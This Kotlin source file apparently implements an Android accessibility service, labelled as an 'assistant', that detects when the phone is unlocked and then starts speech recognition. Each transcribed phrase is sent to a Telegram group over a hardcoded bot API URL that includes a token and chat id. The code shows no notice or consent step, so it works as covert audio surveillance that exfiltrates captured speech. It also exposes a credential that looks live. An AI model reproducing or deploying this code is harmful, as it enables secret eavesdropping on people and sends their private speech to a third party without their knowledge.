package ir.meros.assistant

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Bundle
import android.speech.RecognitionListener
import android.speech.RecognizerIntent
import android.speech.SpeechRecognizer
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import java.util.Locale
import okhttp3.*
import java.io.IOException

class UnlockAccessibilityService : AccessibilityService() {

    private var speechRecognizer: SpeechRecognizer? = null
    private var isLocked = false
    private lateinit var speechIntent: Intent
    private var listeningTimes = 0

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val className = event.className?.toString() ?: return
            Log.d("UnlockService", "Window changed: $className")

            val lockScreenClasses = listOf(
                "com.android.keyguard.KeyguardHostView",
                "com.android.systemui.keyguard.KeyguardHostView",
                "com.miui.keyguard.LockScreen",
                "com.miui.keyguard.MiuiKeyguardScreen",
                "android.widget.FrameLayout"
            )

            if (lockScreenClasses.contains(className)) {
                isLocked = true
                listeningTimes = 0
            }

            if (className.contains(
                    "com.miui.home.launcher.Launcher",
                    ignoreCase = true
                ) && isLocked
            ) {
                isLocked = false

                if (SpeechRecognizer.isRecognitionAvailable(this)) {
                    speechRecognizer?.destroy()
                    speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this)

                    speechIntent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
                        putExtra(
                            RecognizerIntent.EXTRA_LANGUAGE_MODEL,
                            RecognizerIntent.LANGUAGE_MODEL_FREE_FORM
                        )
                        putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault())
                        putExtra(RecognizerIntent.EXTRA_SPEECH_INPUT_COMPLETE_SILENCE_LENGTH_MILLIS, 3000L) // سکوت پایانی قبل از ثبت جمله
                        putExtra(RecognizerIntent.EXTRA_SPEECH_INPUT_POSSIBLY_COMPLETE_SILENCE_LENGTH_MILLIS, 3000L) // سکوت احتمالی پایانی
                        putExtra(RecognizerIntent.EXTRA_SPEECH_INPUT_MINIMUM_LENGTH_MILLIS, 5000L) // حداقل زمان ضبط

                    }

                    speechRecognizer?.setRecognitionListener(listener)
                    speechRecognizer?.startListening(speechIntent)
                }
            }
        }
    }


    override fun onInterrupt() {
        speechRecognizer?.destroy()
        speechRecognizer = null
    }

    val listener = object : RecognitionListener {
        override fun onReadyForSpeech(params: Bundle?) {
            Log.d("SpeechRecognizer", "Ready for speech")
        }

        override fun onBeginningOfSpeech() {
            Log.d("SpeechRecognizer", "Speech started")
        }

        override fun onRmsChanged(rmsdB: Float) {}

        override fun onBufferReceived(buffer: ByteArray?) {}

        override fun onEndOfSpeech() {
            Log.d("SpeechRecognizer", "Speech ended")
        }

        override fun onError(error: Int) {
            Log.e("SpeechRecognizer", "Error code: $error")
            if (listeningTimes < 5){
                speechRecognizer?.startListening(speechIntent)
            }
        }

        override fun onResults(results: Bundle?) {
            val matches = results?.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
            if (matches != null) {
                listeningTimes++
                for (result in matches) {
                    Log.d("SpeechRecognizer", "Result: $result")
                    Log.d("SpeechRecognizer", "listeningTimes: $listeningTimes")
                    sendMessageToTelegramGroup(result)
                    if (result.equals("Reset my speaking time")){
                        listeningTimes = 0
                    }
                    if (result.equals("Shut down")){
                        listeningTimes = 5
                    }
                }
            }
            if (listeningTimes < 5) {
                speechRecognizer?.startListening(speechIntent)
            }
        }

        override fun onPartialResults(partialResults: Bundle?) {}

        override fun onEvent(eventType: Int, params: Bundle?) {}
    }


    fun sendMessageToTelegramGroup(message: String) {
        val client = OkHttpClient()
        val url =
            "https://api.telegram.org/bot7607754786:AAFwAY_zGzP5udJmrVerpBBemwd8t5OxjRI/sendMessage?chat_id=-4864356900&text=${message.replace(" ", "%20")}"

        val request = Request.Builder()
            .url(url)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.i("TAG", "sendMessageToTelegramGroup onFailure: $e")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.i("TAG", "sendMessageToTelegramGroup Response: ${response.body?.string()}")
            }
        })
    }


}

